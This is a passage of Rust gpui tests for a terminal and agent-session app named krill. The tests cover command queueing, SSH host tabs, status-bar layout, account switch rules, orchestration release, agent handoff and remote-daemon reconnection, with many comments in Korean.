    let (ours, mut theirs) = UnixStream::pair().unwrap();
    theirs
        .set_read_timeout(Some(std::time::Duration::from_secs(2)))
        .unwrap();
    let pane = layout_of(&view, cx).active_tab().focused;
    cx.update(|_, cx| {
        view.update(cx, |s, cx| {
            s.paths = Some(krill_proto::daemon::Paths {
                socket: state_dir.join("run/krilld.sock"),
                holder: PathBuf::from("/bin/echo"),
                krilld: PathBuf::from("/bin/echo"),
            });
            assert_eq!(s.state_dir(cx).as_deref(), Some(state_dir.as_path()));
            s.attach_test(pane, krill_proto::SessionId(91), ours, cx);
        });
        krill_app::settings::notify_external_change(cx);
    });
    cx.run_until_parked();
    assert_eq!(cx.update(|_, cx| view.read(cx).ssh_hosts.len()), 1);

    cx.update(|window, cx| {
        view.update(cx, |s, cx| s.connect_ssh_host(&host, Some(window), cx));
    });
    let (k, b) = krill_proto::ipc::read_frame(&mut theirs).unwrap().unwrap();
    let sent = String::from_utf8(Input::decode(k, &b).unwrap().bytes).unwrap();
    assert_eq!(sent, "ssh -t -p 2222 owen@10.0.0.42\n");

    // Verify queue_terminal_command triggers Shell::on_config_changed -> run_terminal_command,
    // and preserves FIFO order when multiple commands are queued in the same update cycle.
    cx.update(|_, cx| {
        krill_app::settings::queue_terminal_command("npm install -g @openai/codex", cx);
        krill_app::settings::queue_terminal_command("opencode auth login", cx);
    });
    cx.run_until_parked();
    let (k2, b2) = krill_proto::ipc::read_frame(&mut theirs).unwrap().unwrap();
    let sent2 = String::from_utf8(Input::decode(k2, &b2).unwrap().bytes).unwrap();
    assert_eq!(sent2, "npm install -g @openai/codex\n");
    let (k3, b3) = krill_proto::ipc::read_frame(&mut theirs).unwrap().unwrap();
    let sent3 = String::from_utf8(Input::decode(k3, &b3).unwrap().bytes).unwrap();
    assert_eq!(sent3, "opencode auth login\n");

    // When the focused pane is a remote SSH host pane with a remote cwd, run_terminal_command
    // must open a new local login-shell tab with a local default folder instead of typing into the remote pane.
    cx.update(|window, cx| {
        view.update(cx, |s, cx| {
            let p = s.layout.active_tab().focused;
            s.layout
                .set_host(p, krill_app::hosts::HostId::Remote("gpu-box".into()));
            s.layout.set_launch(
                p,
                Create {
                    account: None,
                    program: Program::Login,
                    cwd: b"/remote/only/path".to_vec(),
                    cols: 80,
                    rows: 24,
                },
            );
            s.run_terminal_command("brew install gh", Some(window), cx);
        });
    });
    assert_eq!(layout_of(&view, cx).tabs().len(), 2);
    let new_pane = layout_of(&view, cx).active_tab().focused;
    assert!(layout_of(&view, cx).host(new_pane).is_local());
    assert_ne!(
        layout_of(&view, cx)
            .launch(new_pane)
            .map(|c| c.cwd.as_slice()),
        Some(b"/remote/only/path".as_slice())
    );

    // When the focused pane is a local Agent pane with a bound account, run_terminal_command
    // must open a new login-shell tab with account: None while keeping the local cwd.
    cx.update(|window, cx| {
        view.update(cx, |s, cx| {
            let p = s.layout.active_tab().focused;
            s.layout.set_launch(
                p,
                Create {
                    account: Some("claude-work".into()),
                    program: Program::Agent {
                        id: "claude".into(),
                    },
                    cwd: b"/tmp/local-project".to_vec(),
                    cols: 80,
                    rows: 24,
                },
            );
            s.run_terminal_command("krill hook install claude --yes", Some(window), cx);
        });
    });
    assert_eq!(layout_of(&view, cx).tabs().len(), 3);
    let clean_pane = layout_of(&view, cx).active_tab().focused;
    let clean_launch = layout_of(&view, cx).launch(clean_pane).cloned().unwrap();
    assert_eq!(clean_launch.account, None);
    assert_eq!(clean_launch.program, Program::Login);
    assert_eq!(clean_launch.cwd, b"/tmp/local-project".to_vec());

    // When all tabs are closed (even if paths is None), run_terminal_command must still create
    // a tab with a complete Create launch.
    cx.update(|window, cx| {
        view.update(cx, |s, cx| {
            s.paths = None;
            while !s.layout.tabs().is_empty() {
                s.layout.close_tab(0);
            }
            s.run_terminal_command("echo from-empty", Some(window), cx);
        });
    });
    assert_eq!(layout_of(&view, cx).tabs().len(), 1);
    let recovered_pane = layout_of(&view, cx).active_tab().focused;
    let recovered_launch = layout_of(&view, cx)
        .launch(recovered_pane)
        .cloned()
        .expect("new tab from empty layout should have launch metadata");
    assert_eq!(recovered_launch.account, None);
    assert_eq!(recovered_launch.program, Program::Login);
    assert!(!recovered_launch.cwd.is_empty());
}

#[gpui::test]
fn status_bar_keeps_provider_controls_left_and_session_tools_right(cx: &mut TestAppContext) {
    use krill_proto::usage::{AccountInfo, ProviderKind};
    let (view, cx) = open(cx, state_path("status-split"));
    let (ours, _peer) = UnixStream::pair().unwrap();
    cx.update(|_, cx| {
        view.update(cx, |shell, cx| {
            let pane = shell.layout.active_tab().focused;
            shell.layout.set_session(pane, krill_proto::SessionId(81));
            shell.attach_test(pane, krill_proto::SessionId(81), ours, cx);
            // OWE-652: Claude(사용량 있음)·Codex(계정만)만 둔다. agy·opencode는 계정이
            // 없어 알약이 그려지지 않아야 한다. 전역 계정 버튼은 중복이라 없다.
            let account = |provider, id: &str, active: bool, five: Option<u8>| AccountInfo {
                id: id.to_owned(),
                provider,
                label: id.to_owned(),
                email: None,
                profile_dir: String::new(),
                active,
                host_default: false,
                stale: false,
                usage: krill_proto::usage::Snapshot {
                    five_hour: five.map(|percent| krill_proto::usage::Window {
                        percent,
                        resets_at: None,
                    }),
                    seven_day: None,
                },
            };
            shell.accounts_snapshot = krill_proto::usage::AccountsSnapshot {
                accounts: vec![
                    account(ProviderKind::Claude, "host", true, Some(7)),
                    account(ProviderKind::Codex, "codex-main", true, None),
                ],
                ..Default::default()
            };
        });
    });
    cx.simulate_resize(gpui::size(px(1800.), px(900.)));
    cx.run_until_parked();
    let left = cx.debug_bounds("status-bar-left").unwrap();
    let right = cx.debug_bounds("status-bar-right").unwrap();
    let providers = cx.debug_bounds("status-provider-usage").unwrap();
    assert!(left.right() <= right.left(), "{left:?} {right:?}");
    for selector in [
        "status-provider-pill-claude",
        "status-provider-pill-codex",
        "status-usage-refresh",
    ] {
        let bounds = cx.debug_bounds(selector).unwrap();
        assert!(
            bounds.left() >= left.left() && bounds.right() <= left.right(),
            "{selector}: {bounds:?}"
        );
    }
    // OWE-652: 계정 없는 제공자의 알약과 중복 전역 계정 버튼은 그리지 않는다.
    for selector in [
        "status-provider-pill-agy",
        "status-provider-pill-opencode",
        "status-account-switcher",
    ] {
        assert!(
            cx.debug_bounds(selector).is_none(),
            "{selector} must be hidden"
        );
    }
    for selector in [
        "status-daemon",
        "status-usage",
        "status-orchestration-menu",
        "status-ports-menu",
        "status-ssh-switcher",
        "float-terminal",
        "dashboard-popout",
    ] {
        let bounds = cx.debug_bounds(selector).unwrap();
        assert!(providers.right() <= bounds.left(), "{selector}: {bounds:?}");
        assert!(
            bounds.left() >= right.left() && bounds.right() <= right.right(),
            "{selector}: {bounds:?}"
        );
    }
    // Each provider pill opens its own popup in this window, without creating a settings window.
    for selector in ["status-provider-pill-claude", "status-provider-pill-codex"] {
        let bounds = cx.debug_bounds(selector).unwrap();
        cx.simulate_mouse_down(bounds.center(), MouseButton::Left, Modifiers::default());
        cx.simulate_mouse_up(bounds.center(), MouseButton::Left, Modifiers::default());
        cx.run_until_parked();
        assert_eq!(cx.windows().len(), 1);
        assert!(
            cx.update(|window, cx| !view.read(cx).focus.is_focused(window)),
            "{selector}"
        );
        cx.simulate_keystrokes("escape");
        cx.run_until_parked();
    }
}

#[gpui::test]
fn status_account_rule_helpers_persist_all_fields_and_remove_rule(cx: &mut TestAppContext) {
    use krill_proto::usage::{AutoSwitchMetric, AutoSwitchRule, ProviderKind, UsageRequest};

    let layout = state_path("status-account-rules");
    let state = layout.parent().unwrap().to_path_buf();
    let (view, cx) = open(cx, layout);
    let mut rule = AutoSwitchRule {
        provider: ProviderKind::Codex,
        from_account_id: "codex-test-source".into(),
        enabled: true,
        threshold_percent: 85,
        metric: AutoSwitchMetric::SevenDay,
        target_account_id: Some("codex-test-backup".into()),
    };
    cx.update(|_, cx| {
        krill_app::settings::init_at(Some(state.clone()), cx);
        view.update(cx, |shell, cx| {
            shell.link = Link::Down;
            shell.paths = Some(krill_proto::daemon::Paths {
                socket: state.join("run/krilld.sock"),
                holder: PathBuf::from("/bin/echo"),
                krilld: PathBuf::from("/bin/echo"),
            });
            shell.upsert_account_rule(rule.clone(), cx);
            assert_eq!(
                shell.accounts_snapshot.auto_switch.rules,
                vec![rule.clone()]
            );
        });
    });
    cx.run_until_parked();
    let saved = krill_app::accounts::request_local(
        &krill_app::accounts::default_home(),
        Some(&state),
        &UsageRequest::ListAccounts,
    )
    .unwrap();
    assert_eq!(saved.auto_switch.rules, vec![rule.clone()]);

    rule.threshold_percent = 70;
    rule.metric = AutoSwitchMetric::FiveHour;
    rule.target_account_id = None;
    rule.enabled = false;
    cx.update(|_, cx| view.update(cx, |shell, cx| shell.upsert_account_rule(rule.clone(), cx)));
    cx.run_until_parked();
    assert_eq!(
        cx.update(|_, cx| view.read(cx).accounts_snapshot.auto_switch.rules.clone()),
        vec![rule.clone()]
    );
    let saved = krill_app::accounts::request_local(
        &krill_app::accounts::default_home(),
        Some(&state),
        &UsageRequest::ListAccounts,
    )
    .unwrap();
    assert_eq!(saved.auto_switch.rules, vec![rule]);

    cx.update(|_, cx| {
        view.update(cx, |shell, cx| {
            shell.remove_account_rule(ProviderKind::Codex, "codex-test-source", cx);
        });
    });
    cx.run_until_parked();
    assert!(cx.update(|_, cx| view.read(cx).accounts_snapshot.auto_switch.rules.is_empty()));
    let saved = krill_app::accounts::request_local(
        &krill_app::accounts::default_home(),
        Some(&state),
        &UsageRequest::ListAccounts,
    )
    .unwrap();
    assert!(saved.auto_switch.rules.is_empty());
}

/// 오케스트레이션 메뉴의 [Release]는 디스패치를 놓아 주는 데서 끝나지 않고 krilld에 `Close`를 보낸다.
#[gpui::test]
fn orchestration_release_button_closes_worker_session(cx: &mut TestAppContext) {
    use krill_proto::orchestration::{DispatchStatus, OrchestrationStore};
    use krill_proto::screen::Msg as _;
    use std::io::Write as _;
    use std::os::unix::net::UnixListener;

    let layout = state_path("orch-release");
    let dir = layout.parent().unwrap().to_path_buf();
    std::fs::create_dir_all(dir.join("run")).unwrap();
    OrchestrationStore::mutate(&dir, |s| {
        let run = s.create_run("Release", None)?;
        s.start_worker(&run.id, None, "w1", "claude", Some(77), "/tmp", "p")
    })
    .unwrap();
    let socket = dir.join("run/krilld.sock");
    let listener = UnixListener::bind(&socket).unwrap();
    let (tx, rx) = std::sync::mpsc::channel();
    let closed_sessions = std::sync::Arc::new(std::sync::atomic::AtomicUsize::new(0));
    // 앱의 다른 연결(사이드바·사용량 등)도 이 소켓에 붙으므로 연결마다 요청을 모아 답한다.
    // R2 검증 해제 흐름용으로 List·Capture·Close에 답하고, Close 뒤 세션은 목록에서 사라진다.
    std::thread::spawn(move || {
        while let Ok((mut s, _)) = listener.accept() {
            let tx = tx.clone();
            let closed_sessions = closed_sessions.clone();
            std::thread::spawn(move || {
                let hello = krill_proto::ipc::ServerHello {
                    proto_min: krill_proto::ipc::PROTO_MIN,
                    proto_max: krill_proto::ipc::PROTO_MAX,
                    features: krill_proto::ipc::FEATURES & !krill_proto::daemon::FEAT_HOLDER_WATCH,
                    build: "test".into(),
                    instance_id: 1,
                };
                if s.write_all(&hello.encode().unwrap()).is_err() {
                    return;
                }
                let Ok(Some((k, b))) = krill_proto::ipc::read_frame(&mut s) else {
                    return;
                };
                if krill_proto::ipc::ClientHello::decode(k, &b).is_err() {
                    return;
                }
                while let Ok(Some((k, b))) = krill_proto::ipc::read_frame(&mut s) {
                    if let Ok(request) = krill_proto::control::Request::decode(k, &b) {
                        // R2 검증 해제 흐름: List·Capture에도 답한다. Close 뒤 세션은 목록에서 사라진다.
                        let reply = match &request {
                            krill_proto::control::Request::Close { .. } => {
                                closed_sessions.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
                                Some(krill_proto::control::Reply::Closed)
                            }
                            krill_proto::control::Request::List => {
                                let gone =
                                    closed_sessions.load(std::sync::atomic::Ordering::SeqCst) > 0;
                                let ids: &[u64] = if gone { &[] } else { &[77] };
                                Some(krill_proto::control::Reply::Sessions(
                                    ids.iter()
                                        .map(|id| krill_proto::control::Info {
                                            session: krill_proto::SessionId(*id),
                                            pid: 1,
                                            status: None,
                                        })
                                        .collect(),
                                ))
                            }
                            krill_proto::control::Request::Capture { .. } => {
                                Some(krill_proto::control::Reply::Captured {
                                    seq: krill_proto::screen::Seq(0),
                                    bytes: b"prior output".to_vec(),
                                })
                            }
                            _ => None,
                        };
                        if let Some(reply) = reply {
                            s.write_all(&reply.encode().unwrap()).ok();
                        }
                        tx.send(request).ok();
                    }
                }
            });
        }
    });

    let (view, cx) = open(cx, layout);
    let (ours, _peer) = UnixStream::pair().unwrap();
    cx.update(|_, cx| {
        view.update(cx, |shell, cx| {
            shell.paths = Some(krill_proto::daemon::Paths {
                socket,
                holder: dir.join("missing-holder"),
                krilld: dir.join("missing-krilld"),
            });
            let pane = shell.layout.active_tab().focused;
            shell.layout.set_session(pane, krill_proto::SessionId(81));
            shell.attach_test(pane, krill_proto::SessionId(81), ours, cx);
        });
    });
    cx.simulate_resize(gpui::size(px(1800.), px(900.)));
    cx.run_until_parked();
    let menu = cx.debug_bounds("status-orchestration-menu").unwrap();
    cx.simulate_click(menu.center(), Modifiers::default());
    cx.run_until_parked();
    let release = cx.debug_bounds("orch-worker-release-0").unwrap();
    cx.simulate_click(release.center(), Modifiers::default());
    cx.run_until_parked();

    // R2: Released 저장은 백그라운드 검증 흐름이 끝난 뒤라 기한 안 완료를 기다린다.
    let release_deadline = std::time::Instant::now() + std::time::Duration::from_secs(10);
    let store = loop {
        cx.run_until_parked();
        let store = OrchestrationStore::load(&dir).unwrap();
        if store.dispatches[0].status == DispatchStatus::Released {
            break store;
        }
        assert!(
            std::time::Instant::now() < release_deadline,
            "release did not complete: {:?}",
            store.dispatches[0].status
        );
        std::thread::sleep(std::time::Duration::from_millis(20));
    };
    // R2: Close 전에 터미널 출력을 아카이빙한다.
    assert_eq!(
        store.dispatches[0].archived_output.as_deref(),
        Some("prior output")
    );
    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(5);
    let closed = std::iter::from_fn(|| {
        rx.recv_timeout(deadline.saturating_duration_since(std::time::Instant::now()))
            .ok()
    })
    .find(|r| matches!(r, krill_proto::control::Request::Close { .. }));
    assert!(
        matches!(
            closed,
            Some(krill_proto::control::Request::Close {
                session: krill_proto::SessionId(77)
            })
        ),
        "{closed:?}"
    );
}

/// Orca 정합(탭 바): 활성 탭의 닫기 버튼만 항상 보이고 비활성은 호버 전 숨는다.
/// 타이틀바 높이는 Orca `h-[36px]` 그대로다.
#[gpui::test]
fn tab_close_visible_only_on_selected_and_titlebar_height(cx: &mut TestAppContext) {
    let (view, cx) = open(cx, state_path("tab-close"));
    cx.simulate_keystrokes("cmd-t cmd-t");
    cx.run_until_parked();
    assert_eq!(layout_of(&view, cx).active(), 2);
    assert!(
        cx.debug_bounds("close-tab-2").is_some(),
        "selected tab must always show its close button"
    );
    assert!(
        cx.debug_bounds("close-tab-0").is_none(),
        "unselected tab must hide its close button before hover"
    );
    assert!(
        cx.debug_bounds("close-tab-1").is_none(),
        "unselected tab must hide its close button before hover"
    );
    let bar = cx.debug_bounds("titlebar").expect("titlebar");
    assert!(
        (f32::from(bar.size.height) - 36.).abs() < 0.5,
        "titlebar height must stay Orca h-[36px], got {bar:?}"
    );
}

/// OWE-633: 팝아웃 핸드오프 클릭은 새 에이전트 탭을 띄우고 클립보드에 브리프를 전달한다.
/// 브리프 입력은 에이전트가 준비될 때까지 기다렸다가 보내므로, 시작 직후 알림은 대기 문구다.
#[gpui::test]
fn handoff_spawns_agent_tab_and_waits_for_ready(cx: &mut TestAppContext) {
    let (view, cx) = open(cx, state_path("handoff"));
    let brief = "[MK SESSION HANDOFF]\nSource session: s9\nTarget agent: codex\n".to_owned();
    let tabs_before = layout_of(&view, cx).tabs().len();
    view.update(cx, |this, cx| {
        this.spawn_handoff_agent("codex", brief.clone(), cx);
    });
    view.update(cx, |this, _| {
        assert_eq!(this.layout.tabs().len(), tabs_before + 1);
        let pane = this.layout.active_tab().focused;
        assert_eq!(
            this.launch_for(pane).program,
            Program::Agent { id: "codex".into() }
        );
        // 아직 붙지 않은 새 탭이라 세션은 없다.
        assert_eq!(this.layout.session(pane), None);
        assert_eq!(
            this.notice,
            Some(krill_app::i18n::catalog::popout::HANDOFF_WAITING.format(&[("agent", "codex")]))
        );
    });
    let clip = cx.read_from_clipboard().and_then(|c| c.text());
    assert_eq!(clip.as_deref(), Some(brief.as_str()));
}

/// OWE-633 추가 과제: 세션이 붙지 않으면 시간 초과 오류를 알리고 브리프를 치지 않는다.
#[gpui::test]
fn handoff_delivery_times_out_without_session(cx: &mut TestAppContext) {
    let (view, cx) = open(cx, state_path("handoff-timeout"));
    view.update(cx, |this, cx| {
        this.new_agent("codex".into(), cx);
        let pane = this.layout.active_tab().focused;
        this.start_handoff_delivery(pane, "codex".into(), b"brief".to_vec(), Duration::ZERO, cx);
    });
    for _ in 0..50 {
        cx.run_until_parked();
        let done = view.update(cx, |this, _| {
            this.notice.clone()
                == Some(
                    krill_app::i18n::catalog::popout::HANDOFF_ERR_TIMEOUT
                        .format(&[("agent", "codex")]),
                )
        });
        if done {
            break;
        }
        std::thread::sleep(Duration::from_millis(20));
    }
    view.update(cx, |this, _| {
        assert_eq!(
            this.notice,
            Some(
                krill_app::i18n::catalog::popout::HANDOFF_ERR_TIMEOUT.format(&[("agent", "codex")])
            )
        );
    });
}

/// OWE-653: 탭 제목은 사이드바 세션 이름과 같은 규칙(터미널 제목 → 에이전트 → 폴더)을 쓰고,
/// 같은 이름은 번호로 구분하며, 탭마다 상태 점이 붙는다.
#[gpui::test]
fn tab_titles_share_sidebar_rule_and_number_duplicates(cx: &mut TestAppContext) {
    use krill_proto::SessionId;
    use krill_proto::control::{AgentState, AgentStatus};
    use std::sync::Arc;

    struct Memory(sidebar::Snapshot);
    impl sidebar::Source for Memory {
        fn fetch(&self) -> std::io::Result<sidebar::Snapshot> {
            Ok(self.0.clone())
        }
    }
    let session = |id, agent: &str| sidebar::Session {
        id: SessionId(id),
        status: AgentStatus {
            state: AgentState::Working,
            agent: agent.into(),
            ..AgentStatus::UNKNOWN
        },
        worktree: None,
        cwd: Some("/Users/alice/project".into()),
        account: None,
    };
    let sessions = vec![session(1, ""), session(2, ""), session(3, "claude")];
    let snapshot = sidebar::Snapshot {
        sessions: sessions.clone(),
        trees: std::collections::BTreeMap::default(),
    };
    let (view, cx) = open(cx, state_path("tab-titles"));
    cx.simulate_keystrokes("cmd-t cmd-t cmd-t");
    cx.run_until_parked();
    cx.update(|_, cx| {
        view.update(cx, |s, cx| {
            let panes: Vec<_> = s.layout.tabs().iter().map(|t| t.focused).collect();
            for (pane, id) in panes.iter().skip(1).zip(1..=3) {
                s.layout.set_session(*pane, SessionId(id));
            }
            s.titles.insert(panes[3], "빌드 중".into());
            let sidebar = s.sidebar.clone();
            sidebar.update(cx, |b, cx| b.connect_source(Arc::new(Memory(snapshot)), cx));
        });
    });
    cx.run_until_parked();
    let labels = cx.update(|_, cx| {
        let s = view.read(cx);
        s.layout
            .tabs()
            .iter()
            .map(|t| s.pane_label(t.focused, cx))
            .collect::<Vec<_>>()
    });
    // 세션 없는 첫 탭은 "터미널", 세션 1·2는 사이드바처럼 폴더 이름, 3은 에이전트, 제목이 있으면 제목.
    assert_eq!(
        labels[0],
        krill_app::i18n::catalog::shell::NEW_TERMINAL.get()
    );
    assert_eq!(labels[1], sidebar::session_label(&sessions[0], None).0);
    assert_eq!(labels[1], "project");
    assert_eq!(labels[2], "project");
    assert_eq!(labels[3], "빌드 중");
    let mut numbered = labels.clone();
    super::tabs::number_duplicates(&mut numbered);
    assert_eq!(
        numbered[1..3],
        ["project".to_owned(), "project 2".to_owned()]
    );
    for id in ["tab-state-0", "tab-state-1", "tab-state-2", "tab-state-3"] {
        assert!(
            cx.debug_bounds(id).is_some(),
            "{id}: tab must show its state dot"
        );
    }
}

/// OWE-653: 단일 칸은 패인 헤더 줄을 숨기고(분할하면 보인다), 저장 명령·맥락 복사는 별도 툴바 줄이 아니라
/// 탭 바 안의 아이콘으로 남는다.
#[gpui::test]
fn single_pane_hides_header_and_commands_live_in_titlebar(cx: &mut TestAppContext) {
    let (view, cx) = open(cx, state_path("pane-header"));
    assert_eq!(layout_of(&view, cx).active_tab().focused.get(), 0);
    let header = "pane-header-0";
    cx.run_until_parked();
    assert!(
        cx.debug_bounds(header).is_none(),
        "single pane shows no header row"
    );
    let bar = cx.debug_bounds("titlebar").expect("titlebar");
    for id in ["quick-commands", "copy-context"] {
        let b = cx.debug_bounds(id).expect("command button stays reachable");
        assert!(
            bar.contains(&b.center()),
            "{id} must sit inside the tab bar, got {b:?} vs {bar:?}"
        );
    }
    view.update(cx, |s, cx| {
        s.change(true, cx, |l| l.split(Axis::Horizontal));
    });
    cx.run_until_parked();
    assert!(
        cx.debug_bounds(header).is_some(),
        "split panes show headers"
    );
}

/// OWE-653: 끝난 세션 배너의 버튼은 문구 오른쪽 끝에 정렬된다.
#[gpui::test]
fn ended_banner_aligns_buttons_to_the_right(cx: &mut TestAppContext) {
    let (view, cx) = open(cx, state_path("ended-banner"));
    let pane = layout_of(&view, cx).active_tab().focused;
    let (ours, _theirs) = UnixStream::pair().unwrap();
    view.update(cx, |s, cx| {
        s.layout.set_session(pane, krill_proto::SessionId(84));
        s.attach_test(pane, krill_proto::SessionId(84), ours, cx);
        assert!(!s.on_frame(pane, krill_proto::screen::kind::CLOSED, &[0], cx));
    });
    cx.run_until_parked();
    let banner = cx.debug_bounds("session-ended").expect("banner");
    let close = cx.debug_bounds("close-ended-pane").expect("close");
    let restart = cx.debug_bounds("restart-0").expect("restart");
    let right = f32::from(banner.right());
    assert!(
        right - f32::from(close.right()) < 16.,
        "close button hugs the banner's right edge: {close:?} in {banner:?}"
    );
    assert!(restart.left() < close.left());
    assert!(
        f32::from(restart.left()) > f32::from(banner.left()) + f32::from(banner.size.width) / 2.
    );
}

/// MK-131(OWE-667): 새 세션 메뉴의 실행 위치(내 Mac 기본값 + 연결된 원격 호스트) 선택과
/// 원격 세션 패인의 탭·패인 헤더 호스트 배지 표시, 분할 시 호스트 상속을 검증한다.
#[gpui::test]
fn multi_host_shell_execution_locations_host_badges_and_sidebar_grouping(cx: &mut TestAppContext) {
    use krill_app::hosts::{HostId, HostStatus, RemoteHostSpec};

    let (view, cx) = open(cx, state_path("multi-host-shell"));
    cx.update(|_, cx| krill_app::settings::init_at(None, cx));
    cx.simulate_resize(gpui::size(px(1200.), px(800.)));
    cx.run_until_parked();
    for lang in [krill_app::i18n::Language::Ko, krill_app::i18n::Language::En] {
        cx.update(|window, cx| {
            krill_app::settings::set_language(lang, cx);
            window.draw(cx).clear(cx);
        });
        cx.run_until_parked();
        let add_mac = cx.debug_bounds("sidebar-add-mac").expect("sidebar-add-mac");
        let sidebar = cx.debug_bounds("sidebar-column").expect("sidebar-column");
        let tabbar = cx.debug_bounds("titlebar").expect("titlebar");
        assert!(
            add_mac.right() <= sidebar.right() && add_mac.right() <= tabbar.left(),
            "sidebar-add-mac ({add_mac:?}) must stay inside sidebar ({sidebar:?}) and before tab bar ({tabbar:?}) in {lang:?}"
        );
    }
    cx.update(|window, cx| {
        krill_app::settings::set_language(krill_app::i18n::Language::Ko, cx);
        window.draw(cx).clear(cx);
    });
    cx.run_until_parked();
    let local_pane = layout_of(&view, cx).active_tab().focused;
    assert_eq!(local_pane.get(), 0);
    assert_eq!(layout_of(&view, cx).host(local_pane), &HostId::Local);

    let studio_id = HostId::Remote("studio-mac".into());
    cx.update(|_, cx| {
        view.update(cx, |s, cx| {
            s.host_manager.sync_specs(&[RemoteHostSpec {
                id: "studio-mac".into(),
                label: "Mac Studio".into(),
                address: "owen@studio.local".into(),
                port: None,
                identity_file: None,
                remote_socket: None,
            }]);
            let manager = s.host_manager.clone();
            s.sidebar.update(cx, move |sb, cx| {
                sb.sync_remote_hosts(&manager, cx);
                sb.set_remote_host_status("studio-mac", HostStatus::Connected, cx);
            });
            assert_eq!(
                s.execution_locations(cx),
                vec![
                    (HostId::Local, text::HOST_LOCAL.get().to_owned()),
                    (studio_id.clone(), "Mac Studio".to_owned()),
                ]
            );
            // 실행 위치를 원격 호스트로 선택하고 새 탭을 열면 원격 호스트 패인이 생성된다.
            s.set_launch_host(studio_id.clone(), cx);
            s.new_tab_on_launch_host(cx);
        });
    });
    cx.run_until_parked();

    let remote_pane = layout_of(&view, cx).active_tab().focused;
    assert_ne!(remote_pane, local_pane);
    assert_eq!(layout_of(&view, cx).host(remote_pane), &studio_id);
    cx.update(|_, cx| {
        let s = view.read(cx);
        assert_eq!(s.host_name_for_pane(local_pane, cx), None);
        assert_eq!(
            s.host_name_for_pane(remote_pane, cx),
            Some("Mac Studio".to_owned())
        );
    });

    // 사이드바에 '내 Mac'과 'Mac Studio' 호스트 섹션 헤더가 동시에 표시된다.
    assert!(cx.debug_bounds("host-header-local").is_some());
    assert!(cx.debug_bounds("host-header-studio-mac").is_some());

    // 로컬 탭에는 호스트 배지가 없고, 원격 탭과 원격 패인 헤더에는 호스트 배지가 표시된다.
    assert_eq!(local_pane.get(), 0);
    assert_eq!(remote_pane.get(), 1);
    assert!(
        cx.debug_bounds("tab-host-badge-0").is_none(),
        "local tab must not show host badge"
    );
    assert!(
        cx.debug_bounds("tab-host-badge-1").is_some(),
        "remote tab must show host badge"
    );
    assert!(
        cx.debug_bounds("pane-host-badge-1").is_some(),
        "remote pane header must show host badge even when unsplit"
    );

    // 원격 패인을 분할(⌘D)하면 새로 생긴 패인도 같은 원격 호스트를 이어받는다.
    cx.simulate_keystrokes("cmd-d");
    cx.run_until_parked();
    let split_pane = layout_of(&view, cx).active_tab().focused;
    assert_ne!(split_pane, remote_pane);
    assert_eq!(layout_of(&view, cx).host(split_pane), &studio_id);
}

/// 원격 연결 실패 시 실제 Shell IO 태스크가 자동 재시도하며 기존 세션 연결을 유지한다.
/// 연결 훅은 메모리 오류만 반환하므로 gpui 실행기에서 외부 IO를 기다리지 않는다.
#[gpui::test]
fn multi_host_shell_automatically_retries_remote_failure(cx: &mut TestAppContext) {
    use krill_app::hosts::{HostTarget, RemoteConnector};
    use std::sync::atomic::{AtomicUsize, Ordering};

    let (view, cx) = open(cx, state_path("remote-retry"));
    let pane = layout_of(&view, cx).active_tab().focused;
    let session = krill_proto::SessionId(73);
    let attempts = Arc::new(AtomicUsize::new(0));
    let count = attempts.clone();
    let target = HostTarget::remote_with_connector(
        "studio",
        PathBuf::new(),
        RemoteConnector::new(
            move || {
                count.fetch_add(1, Ordering::SeqCst);
                Err(std::io::Error::new(
                    std::io::ErrorKind::ConnectionRefused,
                    "remote unavailable",
                ))
            },
            |_, _| {},
        ),
    );
    view.update(cx, |s, cx| {
        s.layout
            .set_host(pane, krill_app::hosts::HostId::Remote("studio".into()));
        s.layout.set_session(pane, session);
        s.live
            .insert(pane, Live::new(Shell::spawn_pane(pane, target, None, cx)));
    });
    cx.run_until_parked();
    assert_eq!(attempts.load(Ordering::SeqCst), 1);
    cx.executor().advance_clock(Duration::from_millis(200));
    cx.run_until_parked();
    assert_eq!(attempts.load(Ordering::SeqCst), 2);
    cx.executor().advance_clock(Duration::from_millis(400));
    cx.run_until_parked();
    assert_eq!(attempts.load(Ordering::SeqCst), 3);
    assert_eq!(layout_of(&view, cx).session(pane), Some(session));
    view.update(cx, |s, _| {
        assert!(!s.live[&pane].pane.is_cold());
        assert_eq!(s.live[&pane].error.as_deref(), Some("remote unavailable"));
    });
}

/// MK-131(OWE-667) 검증 (a):
/// 추가 `krilld` 인스턴스 1개를 임시 상태 디렉터리로 띄우고 가짜 포워더(`KRILL_SSH_BIN` / `krill __forward`)로
/// 원격 호스트를 흉내 내는 통합 테스트:
/// 1. 내 Mac과 원격 호스트 양쪽 세션이 한 사이드바의 각 호스트 그룹 아래 동시에 표시된다.
/// 2. 원격 `krilld`를 `kill -9` 해도 내 Mac 세션과 앱은 영향받지 않고,
///    원격 `krilld` 재기동 시 영속 터널 위에서 자동 재연결·재동기화된다.
#[test]
fn multi_host_local_and_remote_krilld_survive_remote_kill_and_auto_reconnect() {
    use std::fs;
    use std::os::unix::fs::PermissionsExt as _;
    use std::path::Path;
    use std::process::{Child, Command, Stdio};
    use std::sync::mpsc;
    use std::thread;

    use krill_app::hosts::{HostId, HostManager, HostStatus, HostTarget, RemoteHostSpec};
    use krill_app::pane::{self, Pane};
    use krill_proto::control::{Create, Program};
    use krill_proto::daemon::{Paths, client_hello, handshake};
    use krill_proto::input::Now;
    use krill_proto::ipc::{self, ClientRole};

    struct DaemonGuard {
        local_holder: Child,
        remote_holder: Child,
        base_dir: PathBuf,
    }
    impl Drop for DaemonGuard {
        fn drop(&mut self) {
            use krill_proto::control::{Reply, Request};
            use krill_proto::screen::Msg as _;
            use std::io::Write as _;

            // holder 종료만으로는 krilld·PTY가 죽지 않는 것이 제품의 생존 보장이다.
            // 테스트가 만든 세션을 먼저 닫고 현재 세대의 데몬 PID를 수집해 명시적으로 정리한다.
            let mut daemons = Vec::new();
            for host in ["l", "r"] {
                let socket = self.base_dir.join(host).join("run/krilld.sock");
                if let Ok(mut c) = handshake(
                    &socket,
                    &client_hello(ClientRole::Cli, "mk131-cleanup"),
                    Duration::from_secs(2),
                ) {
                    daemons.push(c.server.instance_id);
                    if c.stream.write_all(&Request::List.encode().unwrap()).is_ok()
                        && let Ok(Some((kind, body))) = ipc::read_frame(&mut c.stream)
                        && let Ok(Reply::Sessions(sessions)) = Reply::decode(kind, &body)
                    {
                        for info in sessions {
                            c.stream
                                .write_all(
                                    &Request::Close {
                                        session: info.session,
                                    }
                                    .encode()
                                    .unwrap(),
